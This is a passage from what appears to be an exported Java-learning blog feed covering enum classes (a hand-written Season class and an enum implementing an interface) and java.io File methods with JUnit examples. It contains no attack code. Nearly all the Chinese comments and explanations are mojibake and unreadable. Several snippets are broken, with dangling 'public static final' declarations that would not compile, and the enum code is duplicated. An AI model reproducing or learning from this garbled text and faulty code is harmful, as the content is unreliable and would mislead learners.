//å®šä¹‰çš„æšä¸¾ç±»ç»§æ‰¿äºjava.lang.Enum Season1 spring1 = Season1.SPRING; // toString() System.out.println(spring1); System.out.println(Season1.class.getSuperclass()); //values() Season1[] values = Season1.values(); for (int i = 0; i &lt; values.length; i++) { System.out.println(values[i]); } // valueOf(String objName): æ ¹æ®æä¾›objName, è¿”å›æšä¸¾ç±»ä¸­å¯¹è±¡åæ˜¯objNameçš„å¯¹è±¡ // å¦‚æœæ²¡æœ‰ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ Season1 winter = Season1.valueOf("WINTER"); System.out.println(winter); } } //jdk5.0ä¹‹å‰ï¼šè‡ªå®šä¹‰æšä¸¾ç±» class Season{ //1.å£°æ˜Seasonå¯¹è±¡çš„å±æ€§ private final String seasonName; private final String seasonDesc; //2.ç§æœ‰åŒ–ç±»çš„æ„é€ å™¨, å¹¶ç»™å¯¹è±¡å±æ€§èµ‹å€¼ private Season(String seasonName, String seasonDesc){ this.seasonName = seasonName; this.seasonDesc = seasonDesc; } //3.æä¾›å½“å‰æšä¸¾ç±»çš„å¯¹è±¡çš„å¤šä¸ªå¯¹è±¡ public static final public static final Season SPRING = new Season("æ˜¥å¤©", "æ˜¥æš–èŠ±å¼€"); public static final Season SUMMER = new Season("å¤å¤©", "å¤æ—¥ç‚ç‚"); public static final Season AUTOM = new Season("ç§‹å¤©", "ç§‹é«˜æ°”çˆ½"); public static final Season WINTER = new Season("å†¬å¤©", "å†°å¤©é›ªåœ°"); //4.å…¶ä»–è¯‰æ±‚ï¼šè·å–æšä¸¾ç±»å¯¹è±¡çš„å±æ€§ public String getSeasonName() { return seasonName; } public String getSeasonDesc() { return seasonDesc; } //4.å…¶ä»–è¯‰æ±‚ï¼šæä¾›toString() @Override public String toString() { return "Season{" + "seasonName='" + seasonName + '\'' + ", seasonDesc='" + seasonDesc + '\'' + '}'; } } // //jdk5.0ï¼Œå¯ä»¥ä½¿ç”¨enumå…³é”®å­—å®šä¹‰æšä¸¾ç±»(å¸¸ç”¨) enum Season1{ // 1.æä¾›å½“å‰æšä¸¾ç±»çš„å¸ä¹¡ï¼Œå¤šä¸ªå¯¹è±¡ä¹‹é—´ç”¨,éš”å¼€ SPRING("æ˜¥å¤©", "æ˜¥æš–èŠ±å¼€"), SUMMER("å¤å¤©", "å¤æ—¥ç‚ç‚"), AUTOM("ç§‹å¤©", "ç§‹é«˜æ°”çˆ½"), WINTER("å†¬å¤©", "å†°å¤©é›ªåœ°"); //2.å£°æ˜Seasonå¯¹è±¡çš„å±æ€§ private final String seasonName; private final String seasonDesc; //2.ç§æœ‰åŒ–ç±»çš„æ„é€ å™¨, å¹¶ç»™å¯¹è±¡å±æ€§èµ‹å€¼ private Season1(String seasonName, String seasonDesc){ this.seasonName = seasonName; this.seasonDesc = seasonDesc; } //3.æä¾›å½“å‰æšä¸¾ç±»çš„å¯¹è±¡çš„å¤šä¸ªå¯¹è±¡ public static final //4.å…¶ä»–è¯‰æ±‚ï¼šè·å–æšä¸¾ç±»å¯¹è±¡çš„å±æ€§ public String getSeasonName() { return seasonName; } public String getSeasonDesc() { return seasonDesc; } } ä½¿ç”¨enumå…³é”®å­—å®šä¹‰çš„æšä¸¾ç±»å®ç°æ¥å£package cn.xpshuai.java1; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-24 18:18 * @åŠŸèƒ½ï¼šæšä¸¾ç±» * * ç±»çš„å¯¹è±¡åªæœ‰æœ‰é™ä¸ªã€ç¡®å®šçš„ã€‚æˆ‘ä»¬ç§°æ­¤ç±»ä¸ºæšä¸¾ç±» * å½“éœ€è¦å®šä¹‰ä¸€ç»„å¸¸é‡æ—¶ï¼Œå¼ºçƒˆå»ºè®®ä½¿ç”¨æšä¸¾ç±» * å¦‚æœæšä¸¾ç±»ä¸­åªæœ‰ä¸€ä¸ªå¯¹è±¡ï¼Œåˆ™å¯ä»¥ä½œä¸ºå•ä¾‹æ¨¡å¼çš„å®ç°æ–¹å¼ã€‚ * * * å¦‚ä½•å®šä¹‰æšä¸¾ç±» * æ–¹æ³•1ï¼šjdk5.0ä¹‹å‰ï¼šä¹‹å®šä¹‰æšä¸¾ç±» * æ–¹æ³•2ï¼šjdk5.0ï¼Œå¯ä»¥ä½¿ç”¨enumå…³é”®å­—å®šä¹‰æšä¸¾ç±»(å¸¸ç”¨) * * * Enumä¸­å¸¸ç”¨æ–¹æ³•ï¼š * value() è¿”å›æšä¸¾ç±»å‹çš„å¯¹è±¡æ•°æ® * valueOf() å¯ä»¥æŠŠä¸€ä¸ªå­—ç¬¦ä¸²è½¬ä¸ºå¯¹åº”çš„æšä¸¾ç±»å¯¹è±¡ï¼ˆè¦æ±‚å­—ç¬¦ä¸²å¿…é¡»æ˜¯æšä¸¾ç±»å¯¹è±¡çš„"åå­—"ï¼‰ * toString() è¿”å›å½“å‰æšä¸¾ç±»å¯¹è±¡å¸¸é‡çš„åç§° * * * * * ä½¿ç”¨enumå…³é”®å­—å®šä¹‰çš„æšä¸¾ç±»å®ç°æ¥å£ï¼š *æƒ…å†µ1ï¼šå®ç°æ¥å£ï¼Œåœ¨enumç±»ä¸­å®ç°æŠ½è±¡æ–¹æ³• *æƒ…å†µ2ï¼šè®©æšä¸¾ç±»çš„å¯¹è±¡åˆ†åˆ«å®ç°æ¥å£ä¸­çš„æŠ½è±¡æ–¹æ³• * */ public class EnumTest { public static void main(String[] args) { Season spring = Season.SPRING; System.out.println(spring); // //jdk5.0ï¼Œå¯ä»¥ä½¿ç”¨enumå…³é”®å­—å®šä¹‰æšä¸¾ç±»(å¸¸ç”¨) //å®šä¹‰çš„æšä¸¾ç±»ç»§æ‰¿äºjava.lang.Enum Season1 spring1 = Season1.SPRING; // toString() System.out.println(spring1); System.out.println(Season1.class.getSuperclass()); //values() Season1[] values = Season1.values(); for (int i = 0; i &lt; values.length; i++) { System.out.println(values[i]); values[i].show(); } // valueOf(String objName): æ ¹æ®æä¾›objName, è¿”å›æšä¸¾ç±»ä¸­å¯¹è±¡åæ˜¯objNameçš„å¯¹è±¡ // å¦‚æœæ²¡æœ‰ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ Season1 winter = Season1.valueOf("WINTER"); System.out.println(winter); winter.show(); //ç±»å®ç°äº†è¿™ä¸ªæ¥å£ï¼Œå¯¹è±¡å°±å¯ä»¥å»è°ƒç”¨ } } //jdk5.0ä¹‹å‰ï¼šè‡ªå®šä¹‰æšä¸¾ç±» class Season{ //1.å£°æ˜Seasonå¯¹è±¡çš„å±æ€§ private final String seasonName; private final String seasonDesc; //2.ç§æœ‰åŒ–ç±»çš„æ„é€ å™¨, å¹¶ç»™å¯¹è±¡å±æ€§èµ‹å€¼ private Season(String seasonName, String seasonDesc){ this.seasonName = seasonName; this.seasonDesc = seasonDesc; } //3.æä¾›å½“å‰æšä¸¾ç±»çš„å¯¹è±¡çš„å¤šä¸ªå¯¹è±¡ public static final public static final Season SPRING = new Season("æ˜¥å¤©", "æ˜¥æš–èŠ±å¼€"); public static final Season SUMMER = new Season("å¤å¤©", "å¤æ—¥ç‚ç‚"); public static final Season AUTOM = new Season("ç§‹å¤©", "ç§‹é«˜æ°”çˆ½"); public static final Season WINTER = new Season("å†¬å¤©", "å†°å¤©é›ªåœ°"); //4.å…¶ä»–è¯‰æ±‚ï¼šè·å–æšä¸¾ç±»å¯¹è±¡çš„å±æ€§ public String getSeasonName() { return seasonName; } public String getSeasonDesc() { return seasonDesc; } //4.å…¶ä»–è¯‰æ±‚ï¼šæä¾›toString() @Override public String toString() { return "Season{" + "seasonName='" + seasonName + '\'' + ", seasonDesc='" + seasonDesc + '\'' + '}'; } } interface Info{ void show(); } // //jdk5.0ï¼Œå¯ä»¥ä½¿ç”¨enumå…³é”®å­—å®šä¹‰æšä¸¾ç±»(å¸¸ç”¨) enum Season1 implements Info{ // 1.æä¾›å½“å‰æšä¸¾ç±»çš„å¸ä¹¡ï¼Œå¤šä¸ªå¯¹è±¡ä¹‹é—´ç”¨,éš”å¼€ SPRING("æ˜¥å¤©", "æ˜¥æš–èŠ±å¼€"){ @Override public void show() { System.out.println("æ˜¥å¤©åœ¨å“ªé‡Œ"); } }, SUMMER("å¤å¤©", "å¤æ—¥ç‚ç‚"){ @Override public void show() { System.out.println("å¤å¤©åœ¨å“ªé‡Œ"); } }, AUTOM("ç§‹å¤©", "ç§‹é«˜æ°”çˆ½"){ @Override public void show() { System.out.println("ç§‹å¤©åœ¨å“ªé‡Œ"); } }, WINTER("å†¬å¤©", "å†°å¤©é›ªåœ°"){ @Override public void show() { System.out.println("å†¬å¤©åœ¨å“ªé‡Œ"); } }; //2.å£°æ˜Seasonå¯¹è±¡çš„å±æ€§ private final String seasonName; private final String seasonDesc; //2.ç§æœ‰åŒ–ç±»çš„æ„é€ å™¨, å¹¶ç»™å¯¹è±¡å±æ€§èµ‹å€¼ private Season1(String seasonName, String seasonDesc){ this.seasonName = seasonName; this.seasonDesc = seasonDesc; } //3.æä¾›å½“å‰æšä¸¾ç±»çš„å¯¹è±¡çš„å¤šä¸ªå¯¹è±¡ public static final //4.å…¶ä»–è¯‰æ±‚ï¼šè·å–æšä¸¾ç±»å¯¹è±¡çš„å±æ€§ public String getSeasonName() { return seasonName; } public String getSeasonDesc() { return seasonDesc; } //åœ¨enumç±»ä¸­å®ç°æŠ½è±¡æ–¹æ³• @Override public void show() { System.out.println("è¿™æ˜¯ä¸€ä¸ªå­£èŠ‚"); } //4.å…¶ä»–è¯‰æ±‚ï¼šæä¾›toString() } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Javaå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>å­¦ä¹ è®°å½•</tag>
        <tag>æšä¸¾ç±»</tag>
        <tag>Enum</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaå­¦ä¹ ä¹‹IOæµ]]></title>
    <url>%2Fposts%2F62588%2F</url>
    <content type="text"><![CDATA[Fileç±»çš„ä½¿ç”¨ java.io.Fileç±»:æ–‡ä»¶å’Œæ–‡ä»¶ç›®å½•è·¯å¾„çš„æŠ½è±¡è¡¨ç¤ºå½¢å¼ï¼Œä¸å¹³å°æ— å…³ Fileèƒ½æ–°å»ºã€åˆ é™¤ã€é‡å‘½åæ–‡ä»¶å’Œç›®å½•ï¼Œä½† Fileä¸èƒ½è®¿é—®æ–‡ä»¶å†…å®¹æœ¬èº«ã€‚å¦‚æœéœ€è¦è®¿é—®æ–‡ä»¶å†…å®¹æœ¬èº«ï¼Œåˆ™éœ€è¦ä½¿ç”¨è¾“å…¥/è¾“å‡ºæµã€‚ æƒ³è¦åœ¨Javaç¨‹åºä¸­è¡¨ç¤ºä¸€ä¸ªçœŸå®å­˜åœ¨çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œé‚£ä¹ˆå¿…é¡»æœ‰ä¸€ä¸ªFileå¯¹è±¡ï¼Œä½†æ˜¯Javaç¨‹åºä¸­çš„ä¸€ä¸ªFileå¯¹è±¡ï¼Œå¯èƒ½æ²¡æœ‰ä¸€ä¸ªçœŸå®å­˜åœ¨çš„æ–‡ä»¶æˆ–ç›®å½•ã€‚ Fileå¯¹è±¡å¯ä»¥ä½œä¸ºå‚æ•°ä¼ é€’ç»™æµçš„æ„é€ å™¨ * 1. Fileç±»çš„ä¸€ä¸ªå¯¹è±¡ï¼Œä»£è¡¨ä¸€ä¸ªæ–‡ä»¶æˆ–ä¸€ä¸ªæ–‡ä»¶ç›®å½•(ä¿—ç§°:æ–‡ä»¶å¤¹) * 2. Fileç±»å£°æ˜åœ¨java.ioåŒ…ä¸‹ * 3.Fileç±»ä¸­æ¶‰åŠåˆ°å…³äºæ–‡ä»¶æˆ–æ–‡ä»¶ç›®å½•çš„åˆ›å»ºã€åˆ é™¤ã€é‡å‘½åã€ä¿®æ”¹æ—¶é—´ã€æ–‡ä»¶å¤§å°ç­‰æ–¹æ³•ï¼Œå¹¶æœªæ¶‰åŠåˆ°å†™å…¥æˆ–è¯»å–æ–‡ä»¶å†…å®¹çš„æ“ä½œã€‚å¦‚æœéœ€è¦è¯»å–æˆ–å†™å…¥æ–‡ä»¶å†…å®¹ï¼Œå¿…é¡»ä½¿ç”¨Ioæµæ¥å®Œæˆã€‚ * 4.åç»­Fileç±»çš„å¯¹è±¡é€šå¸¸ä¼šä½œä¸ºå‚æ•°ä¼ é€’åˆ°æµçš„æ„é€ å™¨ä¸­ï¼ŒæŒ‡æ˜è¯»å–æˆ–å†™å…¥çš„"ç»ˆç‚¹" åˆ›å»ºFileç±»çš„å®ä¾‹:å¸¸ç”¨æ„é€ å™¨ï¼š # public File(String pathname) ä»¥pathnameä¸ºè·¯å¾„åˆ›å»ºFileå¯¹è±¡ï¼Œå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„æˆ–è€…ç›¸å¯¹è·¯å¾„ï¼Œå¦‚æœpathnameæ˜¯ç›¸å¯¹è·¯å¾„ï¼Œåˆ™é»˜è®¤çš„å½“å‰è·¯å¾„åœ¨ç³»ç»Ÿå±æ€§user.dirä¸­å­˜å‚¨ã€‚ ç»å¯¹è·¯å¾„:æ˜¯ä¸€ä¸ªå›ºå®šçš„è·¯å¾„,ä»ç›˜ç¬¦å¼€å§‹ ç›¸å¯¹è·¯å¾„:æ˜¯ç›¸å¯¹äºæŸä¸ªä½ç½®å¼€å§‹ # public File(String parent,String child) ä»¥parentä¸ºçˆ¶è·¯å¾„ï¼Œchildä¸ºå­è·¯å¾„åˆ›å»ºFileå¯¹è±¡ã€‚ # public File(File parent,String child) æ ¹æ®ä¸€ä¸ªçˆ¶Fileå¯¹è±¡å’Œå­æ–‡ä»¶è·¯å¾„åˆ›å»ºFileå¯¹è±¡ è·¯å¾„åˆ†éš”ç¬¦ï¼š è·¯å¾„ä¸­çš„æ¯çº§ç›®å½•ä¹‹é—´ç”¨ä¸€ä¸ªè·¯å¾„åˆ†éš”ç¬¦éš”å¼€ è·¯å¾„åˆ†éš”ç¬¦å’Œç³»ç»Ÿæœ‰å…³: windowså’ŒDOSç³»ç»Ÿé»˜è®¤ä½¿ç”¨\æ¥è¡¨ç¤º UNIXå’ŒURLä½¿ç”¨/æ¥è¡¨ç¤º Javaç¨‹åºæ”¯æŒè·¨å¹³å°è¿è¡Œï¼Œå› æ­¤è·¯å¾„åˆ†éš”ç¬¦è¦æ…ç”¨ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªéšæ‚£ï¼ŒFileç±»æä¾›äº†ä¸€ä¸ªå¸¸é‡:public static final String separatorã€‚æ ¹æ®æ“ä½œç³»ç»Ÿï¼ŒåŠ¨æ€çš„æä¾›åˆ†éš”ç¬¦ã€‚ä¸¾ä¾‹: File file1 = new File("d:\\hello.txt"); File file2 = new File("d:" + File.separator + "hello.txt"); File file3 = new File("d:/hello.txt"); /* 1.å¦‚ä½•åˆ›å»ºFileç±»çš„å®ä¾‹ File(String filePath) File(String parentPath, String childPath) File(File parentPath, String childPath) 2.ç›¸å¯¹è·¯å¾„ã€ç»å¯¹è·¯å¾„ 3.è·¯å¾„åˆ†éš”ç¬¦ * */ @Test public void test(){ //æ„é€ å™¨1ï¼š //ç›¸å¯¹è·¯å¾„(ç›¸è¾ƒäºæŸä¸ªè·¯å¾„ä¸‹ï¼ŒæŒ‡æ˜çš„è·¯å¾„:è¿™é‡Œçš„IDEAä¸­ç›¸å¯¹äºå½“å‰moduleä¸­) File file1 = new File("hello.txt"); //ç»å¯¹è·¯å¾„ File file2 = new File("d:\\hello.txt"); // ä¸ºäº†è§£å†³ä¸åŒæ“ä½œç³»ç»Ÿä¸‹è·¯å¾„åˆ†éš”ç¬¦çš„éšæ‚£ï¼ŒFileç±»æä¾›äº†ä¸€ä¸ªå¸¸é‡:`public static final String separator`ã€‚æ ¹æ®æ“ä½œç³»ç»Ÿï¼ŒåŠ¨æ€çš„æä¾›åˆ†éš”ç¬¦ File file3 = new File("d:" + File.separator + "hello.txt"); //æ„é€ å™¨2ï¼š File file4 = new File("d:\\Code", "JavaCode"); //æ„é€ å™¨3ï¼š File file5 = new File(file4, "1.txt"); } å¸¸ç”¨æ–¹æ³•Fileç±»çš„è·å–åŠŸèƒ½ public String getAbsolutePath():è·å–ç»å¯¹è·¯å¾„ public String getPath():è·å–è·¯å¾„ public String getName():è·å–åç§° public String getParent():è·å–ä¸Šå±‚æ–‡ä»¶ç›®å½•è·¯å¾„ã€‚è‹¥æ— ï¼Œè¿”å›null public long length():è·å–æ–‡ä»¶é•¿åº¦ï¼ˆå³:å­—èŠ‚æ•°ï¼‰ã€‚ä¸èƒ½è·å–ç›®å½•çš„é•¿åº¦ã€‚ public long lastModified():è·å–æœ€åä¸€æ¬¡çš„ä¿®æ”¹æ—¶é—´ï¼Œæ¯«ç§’å€¼ # ä»¥ä¸‹ä¸¤ä¸ªé€‚ç”¨äºæ–‡ä»¶ç›®å½• public String[] list():è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶æˆ–è€…æ–‡ä»¶ç›®å½•çš„åç§°æ•°ç»„ public File[] listFiles():è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶æˆ–è€…æ–‡ä»¶ç›®å½•çš„Fileæ•°ç»„ Fileç±»çš„é‡å‘½ååŠŸèƒ½ public boolean renameTo(File dest):æŠŠæ–‡ä»¶é‡å‘½åä¸ºæŒ‡å®šçš„æ–‡ä»¶è·¯å¾„ Fileç±»çš„åˆ¤æ–­åŠŸèƒ½ public boolean isDirectory():åˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶ç›®å½• public boolean isFile():åˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶ public boolean exists() :åˆ¤æ–­æ˜¯å¦å­˜åœ¨ public boolean canRead():åˆ¤æ–­æ˜¯å¦å¯è¯» public boolean canWrite():åˆ¤æ–­æ˜¯å¦å¯å†™ public boolean isHidden():åˆ¤æ–­æ˜¯å¦éšè— Fileç±»çš„åˆ›å»ºåŠŸèƒ½: public boolean createNewFile():åˆ›å»ºæ–‡ä»¶ã€‚è‹¥æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™ä¸åˆ›å»ºï¼Œè¿”å›false public boolean mkdir() :åˆ›å»ºæ–‡ä»¶ç›®å½•ã€‚å¦‚æœæ­¤æ–‡ä»¶ç›®å½•å­˜åœ¨ï¼Œå°±ä¸åˆ›å»ºäº†ã€‚å¦‚æœæ­¤æ–‡ä»¶ç›®å½•çš„ä¸Šå±‚ç›®å½•ä¸å­˜åœ¨ï¼Œä¹Ÿä¸åˆ›å»ºã€‚ public boolean mkdirs():åˆ›å»ºæ–‡ä»¶ç›®å½•ã€‚å¦‚æœä¸Šå±‚æ–‡ä»¶ç›®å½•ä¸å­˜åœ¨ï¼Œä¸€å¹¶åˆ›å»º # æ³¨æ„äº‹é¡¹:å¦‚æœä½ åˆ›å»ºæ–‡ä»¶æˆ–è€…æ–‡ä»¶ç›®å½•æ²¡æœ‰å†™ç›˜ç¬¦è·¯å¾„ï¼Œé‚£ä¹ˆï¼Œé»˜è®¤åœ¨é¡¹ç›®è·¯å¾„ä¸‹ã€‚ Fileç±»çš„åˆ é™¤åŠŸèƒ½: public boolean delete():åˆ é™¤æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹ # åˆ é™¤æ³¨æ„äº‹é¡¹: Javaä¸­çš„åˆ é™¤ä¸èµ°'å›æ”¶ç«™'ã€‚ è¦åˆ é™¤ä¸€ä¸ªæ–‡ä»¶ç›®å½•ï¼Œè¯·æ³¨æ„è¯¥æ–‡ä»¶ç›®å½•å†…ä¸èƒ½åŒ…å«æ–‡ä»¶æˆ–è€…æ–‡ä»¶ç›®å½• ä»£ç ï¼š @Test public void test1(){ File file1 = new File("hello.txt"); File file2 = new File("d:\\io\\1.txt"); System.out.println(file1.getAbsolutePath()); System.out.println(file1.getName()); //å¦‚æœåªæ˜¯åœ¨å†…å­˜ä¸­ï¼Œæ²¡æœ‰åˆ›å»ºï¼Œè·å–çš„å€¼æ˜¯null System.out.println(file1.getParent()); // ç›¸å¯¹è·¯å¾„ä¸€èˆ¬æ˜¯è·å–ä¸åˆ°çˆ¶çº§ç›®å½•çš„ System.out.println(file1.getAbsoluteFile()); System.out.println(file1.length()); System.out.println(file1.lastModified()); System.out.println("***********"); System.out.println(file2.getAbsolutePath()); // d:\io System.out.println(file2.getName()); // d:\io System.out.println(file2.getParent()); // d:\io System.out.println(file2.getAbsoluteFile()); // d:\io\1.txt System.out.println(file2.length()); System.out.println(new Date(file2.lastModified())); System.out.println("***********"); // # é€‚ç”¨äºæ–‡ä»¶ç›®å½• File file3 = new File("E:\\Code"); //è·å–æ–‡ä»¶å String[] list = file3.list(); for (String s: list){ System.out.println(s); } //ç»å¯¹è·¯å¾„çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ File[] list2 = file3.listFiles(); for (File f: list2){ System.out.println(f); } //é‡å‘½å // public boolean renameTo(File dest):æŠŠæ–‡ä»¶é‡å‘½åä¸ºæŒ‡å®šçš„æ–‡ä»¶è·¯å¾„ //è¦æƒ³è¿”å›trueï¼Œéœ€ä¿è¯ï¼šfile4åœ¨ç¡¬ç›˜ä¸­å­˜åœ¨ï¼Œä¸”file5ä¸èƒ½å­˜åœ¨ File file4 = new File("d:\\io\\2.txt"); File file5 = new File("d:\\io\\222222.txt"); //file4å‘½åä¸ºfile5(file4å°±æ²¡äº†ï¼Œfile5å°±å­˜åœ¨äº†) boolean renameTo = file4.renameTo(file5); System.out.println(renameTo); // public boolean isDirectory():åˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶ç›®å½• System.out.println(file3.isDirectory()); // public boolean isFile():åˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶ System.out.println(file3.isFile()); // public boolean exists() :åˆ¤æ–­æ˜¯å¦å­˜åœ¨ System.out.println(file3.exists()); // public boolean canRead():åˆ¤æ–­æ˜¯å¦å¯è¯» System.out.println(file3.canRead()); // public boolean canWrite():åˆ¤æ–­æ˜¯å¦å¯å†™ System.out.println(file3.canWrite()); // public boolean isHidden():åˆ¤æ–­æ˜¯å¦éšè— System.out.println(file3.isHidden()); } /* çœŸæ­£åœ¨ç¡¬ç›˜ä¸Šåˆ›å»ºã€åˆ é™¤ 1.Fileç±»çš„åˆ›å»ºåŠŸèƒ½: public boolean createNewFile():åˆ›å»ºæ–‡ä»¶ã€‚è‹¥æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™ä¸åˆ›å»ºï¼Œè¿”å›false public boolean mkdir() :åˆ›å»ºæ–‡ä»¶ç›®å½•ã€‚å¦‚æœæ­¤æ–‡ä»¶ç›®å½•å­˜åœ¨ï¼Œå°±ä¸åˆ›å»ºäº†ã€‚å¦‚æœæ­¤æ–‡ä»¶ç›®å½•çš„ä¸Šå±‚ç›®å½•ä¸å­˜åœ¨ï¼Œä¹Ÿä¸åˆ›å»ºã€‚ public boolean mkdirs():åˆ›å»ºæ–‡ä»¶ç›®å½•ã€‚å¦‚æœä¸Šå±‚æ–‡ä»¶ç›®å½•ä¸å­˜åœ¨ï¼Œä¸€å¹¶åˆ›å»º # æ³¨æ„äº‹é¡¹:å¦‚æœä½ åˆ›å»ºæ–‡ä»¶æˆ–è€…æ–‡ä»¶ç›®å½•æ²¡æœ‰å†™ç›˜ç¬¦è·¯å¾„ï¼Œé‚£ä¹ˆï¼Œé»˜è®¤åœ¨é¡¹ç›®è·¯å¾„ä¸‹ã€‚ 2.Fileç±»çš„åˆ é™¤åŠŸèƒ½: public boolean delete():åˆ é™¤æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹ # åˆ é™¤æ³¨æ„äº‹é¡¹: Javaä¸­çš„åˆ é™¤ä¸èµ°'å›æ”¶ç«™'ã€‚ è¦åˆ é™¤ä¸€ä¸ªæ–‡ä»¶ç›®å½•ï¼Œè¯·æ³¨æ„è¯¥æ–‡ä»¶ç›®å½•å†…ä¸èƒ½åŒ…å«æ–‡ä»¶æˆ–è€…æ–‡ä»¶ç›®å½• */ @Test public void test2() throws IOException { //æ–‡ä»¶åˆ›å»ºå’Œåˆ é™¤ File file = new File("d:\\io\\2.txt"); if(!file.exists()){ //å¦‚æœä¸å­˜åœ¨å°±åˆ›å»º file.createNewFile(); System.out.println("åˆ›å»ºok"); }else{ //å¦‚æœå­˜åœ¨ï¼Œå°±åˆ é™¤ file.delete(); System.out.println("delete ok"); } //ç›®å½•çš„åˆ›å»ºå’Œåˆ é™¤ File pathName = new File("d:\\io\\xx\\yy"); if(!pathName.exists()){ //å¦‚æœä¸å­˜åœ¨å°±åˆ›å»º boolean mk = pathName.mkdir(); //boolean mk = pathName.mkdirs(); //å¦‚æœä¸Šçº§ç›®å½•ä¸å­˜åœ¨å°±é€’å½’åˆ›å»ºç›®å½• if(mk){ System.out.println("ç›®å½•åˆ›å»ºok"); } }else{ //å¦‚æœå­˜åœ¨ï¼Œå°±åˆ é™¤ pathName.delete(); // æ³¨æ„è¯¥æ–‡ä»¶ç›®å½•å†…ä¸èƒ½åŒ…å«æ–‡ä»¶æˆ–è€…æ–‡ä»¶ç›®å½• System.out.println("ç›®å½•delete ok"); } } IOæµåŸç†åŠæµçš„åˆ†ç±» l/Oæ˜¯Input/Outpqtçš„ç¼©å†™ï¼ŒI/OæŠ€æœ¯æ˜¯éå¸¸å®ç”¨çš„æŠ€æœ¯ï¼Œç”¨äºå¤„ç†è®¾å¤‡ä¹‹é—´çš„æ•°æ®ä¼ è¾“ã€‚å¦‚è¯»/å†™æ–‡ä»¶ï¼Œç½‘ç»œé€šè®¯ç­‰ã€‚ Javaç¨‹åºä¸­ï¼Œå¯¹äºæ•°æ®çš„è¾“å…¥/è¾“å‡ºæ“ä½œä»¥â€œæµ(stream)â€çš„æ–¹å¼è¿›è¡Œã€‚ java.ioåŒ…ä¸‹æä¾›äº†å„ç§â€œæµâ€ç±»å’Œæ¥å£ï¼Œç”¨ä»¥è·å–ä¸åŒç§ç±»çš„æ•°æ®ï¼Œå¹¶é€šè¿‡æ ‡å‡†çš„æ–¹æ³•è¾“å…¥æˆ–è¾“å‡ºæ•°æ®ã€‚ è¾“å…¥input: è¯»å–å¤–éƒ¨æ•°æ®ï¼ˆç£ç›˜ã€å…‰ç›˜ç­‰å­˜å‚¨è®¾å¤‡çš„æ•°æ®ï¼‰åˆ°ç¨‹åºï¼ˆå†…å­˜)ä¸­ã€‚ è¾“å‡ºoutput: å°†ç¨‹åºï¼ˆå†…å­˜)æ•°æ®è¾“å‡ºåˆ°ç£ç›˜ã€å…‰ç›˜ç­‰å­˜å‚¨è®¾å¤‡ä¸­ã€‚ æˆ‘ä»¬è¦ç«™åœ¨ç¨‹åºçš„è§’åº¦ æµçš„åˆ†ç±» æŒ‰æ“ä½œæ•°æ®å•ä½ä¸åŒåˆ†ä¸º:å­—èŠ‚æµ(8 bit â€“ bytes)ï¼Œå­—ç¬¦æµ(16 bit â€” char) æŒ‰æ•°æ®æµçš„æµå‘ä¸åŒåˆ†ä¸º: è¾“å…¥æµ(æ•°æ®â€”&gt;ç¨‹åº)ï¼Œè¾“å‡ºæµ(ç¨‹åºâ€“&gt;æ•°æ®) æŒ‰æµçš„è§’è‰²çš„ä¸åŒåˆ†ä¸º:èŠ‚ç‚¹æµ(ç›´æ¥ä½œç”¨åœ¨æ–‡ä»¶ä¸Šçš„)ï¼Œå¤„ç†æµ(è¿™ä¸ªæµçš„å¯¹è±¡ä½œä¸ºå¤–é¢çš„æµçš„å‚æ•°ï¼ŒåŒ…äº†ä¸€å±‚ï¼ŒåŠ å¿«äº†ä¼ è¾“é€Ÿåº¦) | ï¼ˆæŠ½è±¡åŸºç±»ï¼‰ | å­—èŠ‚æµ | å­—ç¬¦æµ || :â€”â€”â€”-: | :â€”â€”â€”-: | :â€”-: || è¾“å…¥æµ | InputStream | Reader || è¾“å‡ºæµ | OutputStream | Writer | Javaçš„IOæµå…±æ¶‰åŠ40å¤šä¸ªç±»ï¼Œå® é™…ä¸Šéå¸¸è§„åˆ™ï¼Œéƒ½æ˜¯ä»å¦‚ä¸Š4ä¸ªæŠ½è±¡åŸºç±»æ´¾ç”Ÿçš„ã€‚ ç”±è¿™å››ä¸ªç±»æ´¾ç”Ÿå‡ºæ¥çš„å­ç±»åç§°éƒ½æ˜¯ä»¥å…¶çˆ¶ç±»åä½œä¸ºå­ç±»ååç¼€ï¼ˆæ¯”å¦‚åç¼€å¸¦Streamçš„éƒ½æ˜¯å­—èŠ‚ï¼Œåç¼€å¸¦Readeræˆ–Writerçš„éƒ½æ˜¯å­—èŠ‚ï¼‰ã€‚ æ·±è‰²çš„ä¸ºé‡ç‚¹ èŠ‚ç‚¹æµ(æˆ–æ–‡ä»¶æµ)å­—ç¬¦æµ FileReader FileWriter å­—ç¬¦æµä¸èƒ½è¯»å–å›¾ç‰‡ç­‰å­—èŠ‚æ•°æ® ä»£ç ï¼š /* å­—ç¬¦æµï¼š FileReader FileWriter Note: 1. read()çš„ç†è§£:è¿”å›è¯»å…¥çš„ä¸€ä¸ªå­—ç¬¦ã€‚å¦‚æœè¾¾åˆ°æ–‡ä»¶æœ«å°¾ï¼Œè¿”å›-1 